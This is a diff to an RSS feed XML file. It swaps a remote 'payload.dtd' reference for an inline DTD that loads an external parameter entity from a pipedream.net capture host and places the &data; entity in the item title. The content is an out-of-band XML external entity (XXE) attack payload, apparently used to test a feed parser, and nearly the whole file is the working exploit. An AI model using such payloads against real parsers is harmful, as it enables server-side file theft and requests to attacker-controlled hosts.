@@ -1,16 +1,21 @@
 <?xml version="1.0"?>
-<!DOCTYPE rss SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
+<!DOCTYPE rss [
+  <!ELEMENT rss ANY>
+  <!ENTITY % sp SYSTEM "https://022b0d4fc5ca54f440504013751d320f.m.pipedream.net">
+  %sp;
+]>
 <rss>
     <channel>
         <item>
             <title>
+               &data;
                title
             </title>
             <link>
                 hello
             </link>
             <description>
-                &data;
+                lol
             </description>
             <pubDate>
                 pubdate
